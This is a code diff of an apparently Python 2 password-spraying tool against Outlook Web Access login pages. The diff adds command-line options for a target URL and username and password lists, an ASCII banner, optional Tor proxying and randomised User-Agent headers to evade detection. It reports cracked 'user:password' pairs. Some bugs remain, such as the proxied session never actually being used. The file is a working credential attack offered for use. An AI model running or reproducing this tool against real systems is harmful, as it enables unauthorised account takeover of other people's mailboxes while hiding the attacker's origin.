@@ -1,13 +1,20 @@
-import requests
+import argparse
+import os
 import random
 
+import requests
 
-def get_tor_session(ip="127.0.0.1", port="9150"):
-    session = requests.session()
-    session.proxies = {'http': "socks5://{}:{}".format(ip, port),
-                       'https': "socks5://{}:{}".format(ip,port)
-                    }
-    return session
+
+def print_banner():
+    print "\n" \
+          "  .--. .-.   .-. .--.                                \n" \
+          " : ,. :: :.-.: :: .; :                               \n" \
+          " : :: :: :: :: ::    : .--. .---. .--.  .--.  .-..-. \n" \
+          " : :; :: `' `' ;: :: :`._-.': .; `: ..'' .; ; : :; : \n" \
+          " `.__.' `.,`.,' :_;:_;`.__.': ._.':_;  `.__,_;`._. ; \n" \
+          "                            : :                .-. : \n" \
+          "                            :_;                `._.' \n"
+
 
 def get_headers():
     user_agent_list = [
@@ -39,6 +46,7 @@ def get_headers():
     ]
     return {'User-Agent': random.choice(user_agent_list)}
 
+
 def get_passwords(passwords_file):
     passwords = []
     with open(passwords_file) as f:
@@ -47,7 +55,17 @@ def get_passwords(passwords_file):
     passwords.sort()
     return passwords
 
-def spray(browser_session, url, username, passwords, tor=True message="Try entering it again"):
+
+def get_tor_session(ip=None, port=None):
+    session = requests.session()
+    if ip and port:
+        session.proxies = {'http': "socks5://{}:{}".format(ip, port),
+                           'https': "socks5://{}:{}".format(ip, port)
+                           }
+    return session
+
+
+def spray(browser_session, url, username, passwords, message="Try entering it again"):
     headers = get_headers()
     browser_session.get(url, headers=get_headers())
     for password in passwords:
@@ -57,7 +75,7 @@ def spray(browser_session, url, username, passwords, tor=True message="Try enter
             "forcedownlevel": 0,
             "username": username,
             "password": password,
-            "passwordText":"",
+            "passwordText": "",
             "isUtf8": 1
         }
         response = browser_session.post("{}/auth.owa".format(url), data=login_data, headers=headers)
@@ -67,19 +85,35 @@ def spray(browser_session, url, username, passwords, tor=True message="Try enter
 
 
 if __name__ == '__main__':
-    tor = True
-    usernames_file = 'usernames.txt'
-    passwords_file = 'passwords.txt'
+    print_banner()
+    parser = argparse.ArgumentParser()
 
-    usernames = []
-    with open(usernames_file) as f:
+    parser.add_argument("-t", "--target", help="URL of the target.", required=True)
+    parser.add_argument("-u", "--username_file", help="The list of users.", required=True)
+    parser.add_argument("-p", "--password_file", help="The list of passwords to try.", required=True)
+
+    parser.add_argument("--tor-host", help="Tor server.", required=False)
+    parser.add_argument("--tor-port", help="Tor port server.", required=False)
+
+    args = parser.parse_args()
+
+    if not os.path.isfile(args.username_file):
+        print "ERROR: the list of users can't be found."
+        exit(-1)
+
+    if not os.path.isfile(args.password_file):
+        print "ERROR: the list of users can't be found."
+        exit(-1)
+
+    username_list = []
+    with open(args.username_file) as f:
         for line in f:
-            usernames.append(line.rstrip())
-    
-    passwords = get_passwords(passwords_file)
+            username_list.append(line.rstrip())
 
-    for username in usernames:
-        browser_session = get_tor_session() if tor else: requests.session() 
-        password = spray(get_tor_session, url, username, passwords[:].append(username))
+    passwords = get_passwords(args.password_file)
+
+    for username in username_list:
+        browser_session = get_tor_session(args.tor_host, args.tor_port)
+        password = spray(get_tor_session(), args.target, username, [username] + passwords)
         if password:
             print "[+] {}:{}".format(username, password)
